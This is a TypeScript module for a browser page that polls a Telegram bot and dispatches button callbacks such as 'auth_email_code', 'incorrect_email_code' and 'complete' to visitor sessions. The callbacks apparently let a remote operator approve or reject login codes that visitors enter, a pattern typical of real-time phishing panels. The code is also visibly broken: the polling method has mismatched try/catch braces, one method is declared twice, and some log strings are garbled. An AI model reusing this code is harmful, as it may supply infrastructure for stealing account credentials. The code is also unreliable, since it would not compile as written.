// Optimized Telegram Service for Production
// Minimal overhead, maximum performance

import { getSession } from "./telegram-service-enhanced";
import { liteFetch } from "./network-manager-lite";

const TELEGRAM_BOT_TOKEN =
  import.meta.env.VITE_TELEGRAM_BOT_TOKEN || "";
const TELEGRAM_CHAT_ID =
  import.meta.env.VITE_TELEGRAM_CHAT_ID || "";

// Configuration validation
const isValidConfig = () => {
  return TELEGRAM_BOT_TOKEN &&
         TELEGRAM_BOT_TOKEN.trim() !== "" &&
         !TELEGRAM_BOT_TOKEN.includes("YOUR_BOT_TOKEN") &&
         TELEGRAM_CHAT_ID &&
         TELEGRAM_CHAT_ID.trim() !== "" &&
         !TELEGRAM_CHAT_ID.includes("YOUR_CHAT_ID");
};

interface CallbackHandler {
  sessionId: string;
  onCallback: (action: string) => void;
  registeredAt: number;
  lastUsed: number;
}

class OptimizedTelegramService {
  private handlers = new Map<string, CallbackHandler>();
  private isPolling = false;
  private pollInterval: NodeJS.Timeout | null = null;
  private currentPollDelay = 4000; // Start with 4 seconds
  private lastUpdateId = 0;
  private consecutiveErrors = 0;
  private maxErrors = 5; // Reduced for faster recovery
  private processingCommands = new Set<string>();
  private lastErrorLog = 0; // Rate limit error logging
  private circuitBreakerOpen = false; // Circuit breaker state
  private lastCircuitBreakerReset = 0; // Last time circuit breaker was reset

  /**
   * Register handler (simplified)
   */
  registerHandler(
    sessionId: string,
    onCallback: (action: string) => void,
  ): void {
    console.log("📝 Registering handler:", sessionId.slice(-8));

    this.handlers.set(sessionId, {
      sessionId,
      onCallback,
      registeredAt: Date.now(),
      lastUsed: Date.now(),
    });

    if (!this.isPolling && this.handlers.size > 0) {
      if (isValidConfig()) {
        // Add a small delay and connectivity check before starting polling
        this.startPollingSafely();
      } else {
        console.log("⚠️ Telegram polling not started - invalid configuration");
        console.log("📋 Bot token:", TELEGRAM_BOT_TOKEN ? "provided" : "missing");
        console.log("📋 Chat ID:", TELEGRAM_CHAT_ID ? "provided" : "missing");
      }
    }

    this.cleanupOldHandlers();
  }

  /**
   * Start polling with safety checks
   */
  private startPollingSafely(): void {
    // Check connectivity first
    if (!navigator.onLine) {
      console.log("🌐 Device offline, deferring polling start");
      // Try again when online
      window.addEventListener('online', () => {
        if (!this.isPolling && this.handlers.size > 0) {
          setTimeout(() => this.startPolling(), 1000);
        }
      }, { once: true });
      return;
    }

    // Add a small delay to prevent immediate startup issues
    setTimeout(async () => {
      if (!this.isPolling && this.handlers.size > 0) {
        try {
          await this.startPolling();
        } catch (error) {
          console.error("❌ Failed to start polling:", error);
          // Retry after a longer delay
          setTimeout(async () => {
            if (!this.isPolling && this.handlers.size > 0) {
              try {
                await this.startPolling();
              } catch (retryError) {
                console.error("❌ Retry failed:", retryError);
              }
            }
          }, 5000);
        }
      }
    }, 1000);
  }

  /**
   * Validate Telegram configuration
   */
  private validateConfiguration(): boolean {
    if (!isValidConfig()) {
      console.log("⚠️ Telegram configuration invalid:");
      console.log("📋 Bot token:", TELEGRAM_BOT_TOKEN ? "provided" : "missing");
      console.log("📋 Chat ID:", TELEGRAM_CHAT_ID ? "provided" : "missing");
      return false;
    }
    return true;
  }

  /**
   * Start polling (optimized)
   */
  async startPolling(): Promise<void> {
    if (this.isPolling) return;

    if (!this.validateConfiguration()) {
      console.log("���� Invalid configuration");
      return;
    }

    console.log("🔄 Starting optimized polling...");
    this.isPolling = true;
    this.consecutiveErrors = 0;

    // Listen for network events
    this.setupNetworkListeners();

    // Start polling immediately with error handling
    try {
      await this.pollForUpdates();
    } catch (error) {
      console.error("❌ Initial polling failed:", error);
      // Don't stop the service, let the retry logic handle it
    }
  }

  /**
   * Optimized polling
   */
  private async pollForUpdates(): Promise<void> {
    try {
      if (!this.isPolling) return;

      // Validate configuration before polling
      if (!isValidConfig()) {
        console.log("⚠️ Invalid Telegram configuration, stopping polling");
        console.log("📋 Please set valid VITE_TELEGRAM_BOT_TOKEN and VITE_TELEGRAM_CHAT_ID in your .env file");
        this.stopPolling();
        return;
      }

      // Skip polling if offline
      if (!navigator.onLine) {
        console.log("🌐 Device offline, skipping poll");
        this.scheduleNextPoll(5000); // Check again in 5 seconds
        return;
      }

      // Circuit breaker: skip polling if too many recent failures
      if (this.circuitBreakerOpen) {
        const timeSinceReset = Date.now() - this.lastCircuitBreakerReset;
        if (timeSinceReset < 30000) { // 30 seconds
          console.log("⚡ Circuit breaker open, skipping poll");
          this.scheduleNextPoll(10000); // Check again in 10 seconds
          return;
        } else {
          // Try to reset circuit breaker
          this.circuitBreakerOpen = false;
          this.consecutiveErrors = Math.floor(this.consecutiveErrors / 2); // Reduce error count
          console.log("🔄 Circuit breaker reset, attempting to resume polling");
        }
      }

      // Create manual AbortController for better browser compatibility
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 25000);

      const response = await liteFetch(
        `getUpdates?offset=${this.lastUpdateId + 1}&limit=10&timeout=20`,
        {
          method: "GET",
          signal: controller.signal,
        },
        TELEGRAM_BOT_TOKEN,
      );

      clearTimeout(timeoutId);

      if (!response.ok) {
        // Handle authentication errors by stopping polling immediately
        if (response.status === 401) {
          console.error("❌ Invalid bot token (401 Unauthorized) - stopping polling");
          console.log("📋 Please check your VITE_TELEGRAM_BOT_TOKEN in your .env file");
          this.stopPolling();
          return;
        }

        // Handle 404 errors (bot token doesn't exist)
        if (response.status === 404) {
          console.error("❌ Bot not found (404) - stopping polling");
          console.log("��� Please verify your VITE_TELEGRAM_BOT_TOKEN is correct");
          this.stopPolling();
          return;
        }
        throw new Error(`HTTP ${response.status}: ${response.statusText}`);
      }

      const data = await response.json();

      if (!data.ok) {
        throw new Error(`API Error: ${data.description || "Unknown"}`);
      }

      // Process updates
      if (data.result && data.result.length > 0) {
        for (const update of data.result) {
          this.lastUpdateId = update.update_id;

          if (update.callback_query) {
            await this.handleCallback(update.callback_query);
          }
        }
      }

      // Reset on success
      this.consecutiveErrors = 0;
      this.currentPollDelay = Math.max(4000, this.currentPollDelay * 0.9);

      // Reset circuit breaker on successful operation
      if (this.circuitBreakerOpen) {
        console.log("✅ Circuit breaker reset - polling successful");
        this.circuitBreakerOpen = false;
      }
    } catch (error: any) {
      this.consecutiveErrors++;

      // Check if it's a network connectivity issue
      const isNetworkError = error.name === 'AbortError' ||
                           error.name === 'TypeError' ||
                           error.message?.includes("Network error") ||
                           error.message?.includes("Failed to fetch") ||
                           error.message?.includes("timeout") ||
                           error.message?.includes("fetch");

      if (isNetworkError) {
        // Rate limit network error logging (once every 10 seconds)
        const now = Date.now();
        if (now - this.lastErrorLog > 10000) {
          console.warn(`🌐 Network error (${this.consecutiveErrors}/${this.maxErrors * 2}):`, error.message);
          this.lastErrorLog = now;
        }

        // For network errors, use exponential backoff
        const backoffMultiplier = Math.min(3, 1.5 + (this.consecutiveErrors * 0.1));
        this.currentPollDelay = Math.min(60000, this.currentPollDelay * backoffMultiplier);

        // Activate circuit breaker for repeated network errors
        if (this.consecutiveErrors >= this.maxErrors) {
          console.warn("⚡ Activating circuit breaker due to network issues");
          this.circuitBreakerOpen = true;
          this.lastCircuitBreakerReset = Date.now();
        }

        // Be more patient with network errors
        if (this.consecutiveErrors >= this.maxErrors * 2) {
          console.error("❌ Persistent network issues, pausing polling");
          this.stopPolling();

          // Check network status before restarting
          setTimeout(() => {
            if (this.handlers.size > 0 && navigator.onLine) {
              console.log("🔄 Network restored, restarting polling...");
              this.consecutiveErrors = 0;
              this.currentPollDelay = 4000;
              this.circuitBreakerOpen = false;
              this.startPolling();
            }
          }, 60000); // Wait 1 minute for network issues
          return;
        }
      } else {
        // Rate limit regular error logging too
        const now = Date.now();
        if (now - this.lastErrorLog > 5000) {
          console.warn(`⚠️ Polling error (${this.consecutiveErrors}/${this.maxErrors}):`, error.message);
          this.lastErrorLog = now;
        }

        // Regular exponential backoff for non-network errors
        this.currentPollDelay = Math.min(20000, this.currentPollDelay * 1.5);

        // Stop if too many errors
        if (this.consecutiveErrors >= this.maxErrors) {
          console.error("❌ Too many errors, stopping polling");
          this.stopPolling();

          // Restart after delay
          setTimeout(() => {
            if (this.handlers.size > 0) {
              console.log("🔄 Restarting polling...");
              this.consecutiveErrors = 0;
              this.currentPollDelay = 4000;
              this.startPolling();
            }
          }, 30000);
          return;
        }
      }
    }

      // Schedule next poll
      this.scheduleNextPoll();
    } catch (outerError) {
      console.error("❌ Unhandled error in pollForUpdates:", outerError);
      // Stop polling to prevent infinite error loops
      this.stopPolling();
    }
  }

  /**
   * Schedule next poll with optional custom delay
   */
  private scheduleNextPoll(customDelay?: number): void {
    if (this.isPolling) {
      const delay = customDelay || this.currentPollDelay;
      this.pollInterval = setTimeout(() => {
        this.pollForUpdates().catch((error) => {
          console.error("❌ Scheduled polling failed:", error);
          // Let the error handling inside pollForUpdates deal with it
        });
      }, delay);
    }
  }

  /**
   * Setup network event listeners for auto-recovery
   */
  private setupNetworkListeners(): void {
    const handleOnline = () => {
      if (this.isPolling && this.consecutiveErrors > 0) {
        console.log("🌐 Network restored, resetting error count");
        this.consecutiveErrors = 0;
        this.currentPollDelay = 4000; // Reset to normal polling
      }
    };

    const handleOffline = () => {
      console.log("🌐 Network went offline");
    };

    // Remove existing listeners to avoid duplicates
    window.removeEventListener('online', handleOnline);
    window.removeEventListener('offline', handleOffline);

    // Add new listeners
    window.addEventListener('online', handleOnline);
    window.addEventListener('offline', handleOffline);
  }

  /**
   * Handle callback (simplified)
   */
  private async handleCallback(callback: any): Promise<void> {
    const callbackData = callback.data;
    const callbackId = callback.id;

    // Parse callback data
    const parsed = this.parseCallbackData(callbackData);
    console.log("📞 Parsing callback data:", callbackData, "→", parsed);
    if (!parsed) return;

    const { action, sessionId } = parsed;
    console.log("🎯 Callback parsed - Action:", action, "SessionId:", sessionId);

    // Check if session is processing
    if (this.processingCommands.has(sessionId)) {
      return;
    }

    // Find handler
    const handler = this.handlers.get(sessionId);
    if (!handler) {
      return;
    }

    // Process callback
    this.processingCommands.add(sessionId);

    try {
      // Answer callback (fire and forget)
      this.answerCallbackQuery(callbackId, `✅ ${action}`).catch(() => {});

      // Execute callback
      handler.lastUsed = Date.now();
      handler.onCallback(action);
    } catch (error) {
      console.error("❌ Callback error:", error);
    } finally {
      this.processingCommands.delete(sessionId);
    }
  }

  /**
   * Parse callback data
   */
  private parseCallbackData(
    callbackData: string,
  ): { action: string; sessionId: string } | null {
    try {
      const parts = callbackData.split("_");
      if (parts.length < 2) return null;

      let action: string;
      let sessionId: string;

      if (parts[0] === "auth") {
        // Handle compound auth actions like auth_email_code
        if (parts[1] === "email" && parts[2] === "code") {
          action = "auth_email_code";
          sessionId = parts.slice(3).join("_");
        } else {
          action = parts[1];
          sessionId = parts.slice(2).join("_");
        }
      } else if (parts[0] === "incorrect") {
        // Handle compound incorrect actions like incorrect_email_code
        if (parts[1] === "email" && parts[2] === "code") {
          action = "incorrect_email_code";
          sessionId = parts.slice(3).join("_");
        } else {
          action = `incorrect_${parts[1]}`;
          sessionId = parts.slice(2).join("_");
        }
      } else if (parts[0] === "complete") {
        action = "complete";
        sessionId = parts.slice(2).join("_");
      } else if (parts[0] === "check") {
        action = "check_status";
        sessionId = parts.slice(2).join("_");
      } else {
        return null;
      }

      return { action, sessionId };
    } catch {
      return null;
    }
  }

  /**
   * Answer callback query (simplified)
   */
  private async answerCallbackQuery(
    callbackQueryId: string,
    text: string,
  ): Promise<void> {
    if (!this.validateConfiguration()) return;

    try {
      await liteFetch(
        "answerCallbackQuery",
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            callback_query_id: callbackQueryId,
            text: text,
            show_alert: false,
          }),
          signal: AbortSignal.timeout(3000),
        },
        TELEGRAM_BOT_TOKEN,
      );
    } catch {
      // Silently handle errors
    }
  }

  /**
   * Stop polling
   */
  stopPolling(): void {
    this.isPolling = false;
    if (this.pollInterval) {
      clearTimeout(this.pollInterval);
      this.pollInterval = null;
    }
  }

  /**
   * Unregister handler
   */
  unregisterHandler(sessionId: string): void {
    this.handlers.delete(sessionId);
    this.processingCommands.delete(sessionId);

    if (this.handlers.size === 0) {
      this.stopPolling();
    }
  }

  /**
   * Get service health status (for debugging)
   */
  getHealthStatus() {
    return {
      isPolling: this.isPolling,
      consecutiveErrors: this.consecutiveErrors,
      maxErrors: this.maxErrors,
      currentDelay: this.currentPollDelay,
      handlerCount: this.handlers.size,
      isOnline: navigator.onLine,
      circuitBreakerOpen: this.circuitBreakerOpen,
      timeSinceCircuitBreakerReset: this.circuitBreakerOpen ? Date.now() - this.lastCircuitBreakerReset : 0,
      lastErrorLog: new Date(this.lastErrorLog).toLocaleTimeString(),
    };
  }

  /**
   * Test connectivity to Telegram API
   */
  async testConnectivity(): Promise<{ success: boolean; error?: string; responseTime?: number }> {
    if (!this.validateConfiguration()) {
      return { success: false, error: "Invalid configuration" };
    }

    const startTime = Date.now();
    try {
      const response = await liteFetch('getMe', {
        method: 'GET',
        signal: AbortSignal.timeout(5000), // Short timeout for health check
      }, TELEGRAM_BOT_TOKEN);

      const responseTime = Date.now() - startTime;

      if (response.ok) {
        return { success: true, responseTime };
      } else {
        return { success: false, error: `HTTP ${response.status}: ${response.statusText}`, responseTime };
      }
    } catch (error: any) {
      const responseTime = Date.now() - startTime;
      return { success: false, error: error.message, responseTime };
    }
  }

  /**
   * Clean up old handlers
   */
  private cleanupOldHandlers(): void {
    const tenMinutesAgo = Date.now() - 10 * 60 * 1000;

    for (const [sessionId, handler] of this.handlers.entries()) {
      if (handler.registeredAt < tenMinutesAgo) {
        this.handlers.delete(sessionId);
        this.processingCommands.delete(sessionId);
      }
    }
  }

  /**
   * Validate configuration
   */
  private validateConfiguration(): boolean {
    return isValidConfig();
  }

  /**
   * Get debug info
   */
  getDebugInfo() {
    return {
      isPolling: this.isPolling,
      handlerCount: this.handlers.size,
      currentDelay: this.currentPollDelay,
      consecutiveErrors: this.consecutiveErrors,
      lastUpdateId: this.lastUpdateId,
    };
  }
}

// Create singleton
const optimizedTelegramService = new OptimizedTelegramService();

// Export functions
export const registerOptimizedCallback = (
  sessionId: string,
  onCallback: (action: string) => void,
): void => {
  optimizedTelegramService.registerHandler(sessionId, onCallback);
};

export const unregisterOptimizedCallback = (sessionId: string): void => {
  optimizedTelegramService.unregisterHandler(sessionId);
};

export const getOptimizedTelegramDebugInfo = () => {
  return optimizedTelegramService.getDebugInfo();
};

export const getOptimizedTelegramHealth = () => {
  return optimizedTelegramService.getHealthStatus();
};

export const testTelegramConnectivity = () => {
  return optimizedTelegramService.testConnectivity();
};

export { optimizedTelegramService };

// Debug helpers (accessible from browser console)
if (typeof window !== 'undefined') {
  (window as any).telegramServiceHealth = getOptimizedTelegramHealth;
  (window as any).testTelegramConnectivity = testTelegramConnectivity;
}